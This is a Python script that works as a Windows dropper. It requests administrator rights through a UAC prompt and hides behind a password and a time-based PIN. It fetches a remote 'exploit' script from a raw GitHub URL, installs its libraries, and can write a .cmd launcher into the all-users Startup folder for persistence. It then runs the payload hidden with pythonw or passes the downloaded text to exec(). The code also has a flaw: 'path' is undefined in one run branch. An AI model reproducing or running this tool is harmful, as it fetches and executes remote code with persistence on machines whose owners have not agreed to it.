import ctypes
import os
from datetime import datetime as dt
from getpass import getpass
from hashlib import sha256
import sys
import subprocess
from pathlib import Path

import requests as rq

# (script_url: str, libs: list, config_vars: dict, spec_vars: dict)
EXPLOITS = {
    'Non-stopping browser': ('https://raw.githubusercontent.com/WexxanBest/py_exploits/main/nonstop_browser.py',
                             ['pywebview'],
                             {'save_script': True, 'run_script': True},
                             {'<URL>': 'https://docs.python.org/3/library/hashlib.html'})
}
SHORTCUTS = {}
PASSWORD = '8d113c508674df930037e959a6914f9450c182a5b29bf19533dcb505bb17e986'
CHECK = True
STARTUP_FOLDER = r'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/'

CONFIG = dict(
    add_to_startup=None,
    exploit_name=None,
    run_script=None,
    save_script=None,
    script_name=None
)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def check():
    # Password checking
    user_pwd = getpass('Enter password: ')
    if sha256(user_pwd.encode('utf-8')).hexdigest() != PASSWORD:
        print('Wrong password!')
        quit()

    # PIN checking
    user_pin = input('Enter PIN: ')
    if user_pin != str(dt.now().minute + 3) + str(dt.now().hour - 5):
        print('Wrong PIN!')
        quit()


def apply_shortcut():
    code = input('Enter SHORTCUT code (optional): ')
    if code:
        shortcut = SHORTCUTS.get(code)
        if shortcut:
            pass


def apply_config(config: dict):
    CONFIG.update(config)


def choose_exploit():
    while True:
        os.system('cls')
        print('Choose exploit from list below.')
        for i, exploit_name in enumerate(EXPLOITS.keys()):
            print(f'[{i}]', exploit_name)

        user_exp = input('Enter number: ').strip()
        for i, exploit_name in enumerate(EXPLOITS.keys()):
            if str(i) == user_exp:
                return exploit_name


def add_to_start_up(script_path: str):
    filename = input("Write filename for startup: ") + '.cmd'
    filepath = STARTUP_FOLDER + filename
    with open(filepath, mode='w') as file:
        file.write(f'pythonw "{script_path}"')


def get_script(url: str):
    print('Fetching script...', end='')
    res = rq.get(url)
    print('done.')
    return res.text


def ask_true_false(prompt: str) -> bool:
    txt = prompt + ' [Y/n]: '
    while True:
        ans = input(txt)
        if ans.lower() == 'y':
            return True
        elif ans.lower() == 'n':
            return False
        else:
            print('You can only type "y" or "n"! Try again!')


def save_script(script_text: str):
    script_name = input('Script name: ')
    if not script_name:
        script_name = CONFIG['exploit_name']
    script_name += '.py'
    CONFIG['script_name'] = script_name
    with open(script_name, mode='w') as file:
        print(f"Saving script ({script_name})...", end='')
        file.write(script_text)
        print('done.')


def run_script(script_path: str):
    subprocess.run(['pythonw', script_path])


def download_libraries(libs: list):
    print('Downloading libraries...')
    os.system(f'pip install {" ".join(libs)}')
    print('Libraries downloaded!')


if __name__ == '__main__':
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    if CHECK:
        check()

    apply_shortcut()

    if not CONFIG['exploit_name']:
        exploit_name = choose_exploit()
        CONFIG['exploit_name'] = exploit_name
    else:
        exploit_name = CONFIG['exploit_name']

    url, libs, config, spec_vars = EXPLOITS[exploit_name]
    apply_config(config)
    download_libraries(libs)

    print('CONFIGURATION')
    if CONFIG['save_script'] is None:
        CONFIG['save_script'] = ask_true_false('Save script?')

    if CONFIG['run_script'] is None:
        CONFIG['run_script'] = ask_true_false('Run script?')

    if CONFIG['add_to_startup'] is None:
        CONFIG['add_to_startup'] = ask_true_false('Add to startup?')

    print(f"{CONFIG=}")
    script = get_script(url)
    if spec_vars:
        print('SPECIAL VARIABLES')
    for spec_var, value in spec_vars.items():
        user_value = input(f'{spec_var.lower()} (optional): ')
        if user_value:
            value = user_value
        script = script.replace(spec_var, value)

    if CONFIG['save_script']:
        save_script(script)

    if CONFIG['add_to_startup'] and CONFIG['save_script']:
        path = str(Path(CONFIG['script_name']).absolute())
        add_to_start_up(path)

    if CONFIG['run_script'] and CONFIG['save_script']:
        run_script(path)
    elif CONFIG['run_script']:
        exec(script)
